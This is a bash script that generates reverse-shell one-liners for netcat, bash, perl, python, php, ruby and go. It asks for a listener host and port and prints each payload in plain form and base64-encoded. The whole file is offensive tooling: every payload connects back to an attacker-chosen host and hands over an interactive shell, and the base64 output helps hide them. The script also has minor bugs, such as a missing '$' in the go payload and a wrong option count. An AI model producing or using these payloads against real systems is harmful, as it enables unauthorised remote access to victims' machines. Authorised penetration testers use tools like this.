#!/bin/bash

# generate reverse-shells



# colours first
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m'


# Header
echo -e "${RED}"
figlet "Generating Eeevil..."


echo -e ""
echo -e "Welcome to revshell"
echo -e "Select the type of revshell you want from this list..."
echo -e "1=netcat; 1b=nc-win; 2=nc-bsd; 3=bash; 4=perl; 5=python; 6=php; 7=ruby 8=go: "
echo -e "${NC}"
echo -e ""

# case statement
echo -e "${BLUE}"
read -p "Enter Selection: " langu
read -p "Enter lhost: " lhost
read -p "Enter lport: " lport
echo -e "${NC}"
#############################

echo -e "${YELLOW}"
echo -e "Don't forget to set a listener on $lport..." |cowsay
echo -e "${NC}"

if [ -z $langu ];then
	echo "Just a number please..."
	exit
fi

case $langu in
	1)
	 echo "nc $lhost $lport -e /bin/bash"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "nc $lhost $lport -e /bin/bash" |base64;;

	1b)
          echo ".\nc.exe $lhost $lport -e cmd"
	  echo -e "${YELLOW}And in base64 encoding! ${NC}"
	  echo ".\nc.exe $lhost $lport -e cmd" |base64;;

	2)
	 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f" |base64;;

	3)
	 echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1" |base64;;

	4)
	 echo "perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" |base64;;

	5)
	 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$lhost",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" |base64;;


	6)
	 echo "php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "php -r '$sock=fsockopen("$lhost",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" |base64;;

	7)
	 echo "ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "ruby -rsocket -e'f=TCPSocket.open("$lhost",$lport).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" |base64;;

	8)
	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"
	 echo -e "${YELLOW}And in base64 encoding! ${NC}"
	 echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\","$lhost:$lport");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" |base64;;


	*)
	 echo -e "${RED}Sorry, just numbers 1-7 please! ${NC}"
	 exit

esac

echo
 if [[ ! $REPLY =~ ^[Yy]$ ]]
        then
                exit 1
fi

